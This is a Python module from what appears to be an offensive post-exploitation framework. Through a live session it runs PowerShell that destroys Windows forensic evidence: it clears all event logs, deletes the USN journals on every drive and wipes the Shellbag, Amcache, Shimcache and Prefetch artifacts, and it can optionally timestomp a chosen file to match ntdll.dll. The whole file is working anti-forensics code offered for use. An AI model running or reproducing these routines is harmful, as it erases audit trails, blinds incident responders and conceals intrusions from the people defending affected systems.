"""impact/wipe_logs — advanced forensic artifact destruction and timestamp manipulation. MITRE T1070"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class WipeLogs(BasePlugin):
    NAME        = "wipe_logs"
    DESCRIPTION = "Advanced forensic cleanup: Event Logs, USN Journal, Prefetch, Shimcache, Amcache, and Shellbags."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1070"
    CATEGORY    = "impact"
    schema      = ParamSchema().add(
        Param("event_logs",  bool, required=False, default=True,  help="Clear all Windows Event Logs"),
        Param("usn_journal", bool, required=False, default=True,  help="Delete USN Journal (all drives)"),
        Param("shellbags",   bool, required=False, default=True,  help="Wipe shellbag registry keys"),
        Param("amcache",     bool, required=False, default=True,  help="Clear amcache.hve registry"),
        Param("shimcache",   bool, required=False, default=True,  help="Clear shimcache (AppCompatCache)"),
        Param("prefetch",    bool, required=False, default=True,  help="Delete prefetch and superfetch files"),
        Param("timestamps",  bool, required=False, default=False, help="Stomp MACE timestamps on a target file"),
        Param("target_file", str,  required=False, default="",    help="File path for timestamp stomping"),
        Param("ref_file",    str,  required=False, default="C:\\Windows\\System32\\ntdll.dll",
              help="Reference file to copy timestamps from"),
    )

    @mitre("T1070.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        blocks = []

        # 1. Clear Event Logs
        if params.get("event_logs", True):
            blocks.append(
                "Write-Output '[*] Clearing Event Logs...';"
                "try {"
                "  Get-WinEvent -ListLog * -EA SilentlyContinue | ForEach-Object { "
                "    [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) "
                "  };"
                "  Write-Output '  [+] Event logs cleared via .NET';"
                "} catch {"
                "  wevtutil el | ForEach-Object { wevtutil cl \"$_\" };"
                "  Write-Output '  [+] Event logs cleared via wevtutil';"
                "}"
            )

        # 2. USN Journal Deletion
        if params.get("usn_journal", True):
            blocks.append(
                "Write-Output '[*] Deleting USN Journals...';"
                "try {"
                "  $drives = Get-PSDrive -PSProvider FileSystem;"
                "  foreach($d in $drives) {"
                "    $name = $d.Name + ':';"
                "    fsutil usn deletejournal /D $name 2>$null;"
                "    Write-Output \"  [+] Deleted journal for $name\";"
                "  }"
                "} catch { Write-Output '  [-] USN Journal deletion failed' }"
            )

        # 3. Shellbags
        if params.get("shellbags", True):
            blocks.append(
                "Write-Output '[*] Wiping Shellbags...';"
                "$sb_keys=@("
                "  'HKCU:\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\Bags',"
                "  'HKCU:\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\BagMRU',"
                "  'HKCU:\\Software\\Microsoft\\Windows\\Shell\\Bags',"
                "  'HKCU:\\Software\\Microsoft\\Windows\\Shell\\BagMRU'"
                ");"
                "foreach($k in $sb_keys){"
                "  if(Test-Path $k){"
                "    Remove-Item $k -Recurse -Force -EA SilentlyContinue;"
                "    Write-Output \"  [+] Removed: $k\""
                "  }"
                "};"
            )

        # 4. Amcache
        if params.get("amcache", True):
            blocks.append(
                "Write-Output '[*] Wiping Amcache...';"
                "$ac_path='C:\\Windows\\AppCompat\\Programs\\Amcache.hve';"
                "if(Test-Path $ac_path){"
                "  try {"
                "    takeown /f $ac_path /a 2>$null;"
                "    icacls $ac_path /grant administrators:F 2>$null;"
                "    Remove-Item $ac_path -Force -EA Stop;"
                "    Write-Output '  [+] Amcache.hve deleted'"
                "  } catch { Write-Output \"  [-] Amcache deletion failed: $_\" }"
                "} else { Write-Output '  [i] Amcache.hve not found' };"
            )

        # 5. Shimcache
        if params.get("shimcache", True):
            blocks.append(
                "Write-Output '[*] Clearing Shimcache...';"
                "$sc_key='HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache';"
                "try {"
                "  Remove-ItemProperty -Path $sc_key -Name 'AppCompatCache' -Force -EA Stop;"
                "  Write-Output '  [+] Shimcache cleared (requires reboot for full effect)'"
                "} catch { Write-Output \"  [-] Shimcache clear failed: $_\" };"
            )

        # 6. Prefetch
        if params.get("prefetch", True):
            blocks.append(
                "Write-Output '[*] Clearing Prefetch/Superfetch...';"
                "try {"
                "  $pf_files = Get-ChildItem 'C:\\Windows\\Prefetch\\*.pf' -EA SilentlyContinue;"
                "  $pf_files | Remove-Item -Force -EA SilentlyContinue;"
                "  $db_files = Get-ChildItem 'C:\\Windows\\Prefetch\\*.db' -EA SilentlyContinue;"
                "  $db_files | Remove-Item -Force -EA SilentlyContinue;"
                "  Write-Output \"  [+] Deleted $($pf_files.Count + $db_files.Count) artifact files\";"
                "} catch { Write-Output \"  [-] Prefetch cleanup failed: $_\" };"
            )

        # 7. Timestomping
        target = params.get("target_file", "").strip()
        if params.get("timestamps", False) and target:
            ref = params.get("ref_file", "C:\\Windows\\System32\\ntdll.dll")
            blocks.append(
                "Write-Output '[*] Performing Timestomping...';"
                f"$target = '{target}';"
                f"$reference = '{ref}';"
                "if (Test-Path $target) {"
                "  $ref_item = Get-Item $reference;"
                "  $tgt_item = Get-Item $target;"
                "  $tgt_item.CreationTime = $ref_item.CreationTime;"
                "  $tgt_item.LastWriteTime = $ref_item.LastWriteTime;"
                "  $tgt_item.LastAccessTime = $ref_item.LastAccessTime;"
                "  Write-Output \"  [+] Timestamps stomped: $target -> $reference\";"
                "} else { Write-Output \"  [-] Target file not found: $target\" }"
            )

        blocks.append("Write-Output '[!] Advanced forensic cleanup complete.'")
        ps = " ".join(blocks)
        r  = ctx.ps(ps)
        
        if r["status"] != "ok":
            return ModuleResult.err(f"Wipe failed: {r['output']}")
            
        return ModuleResult.ok(data=r["output"])
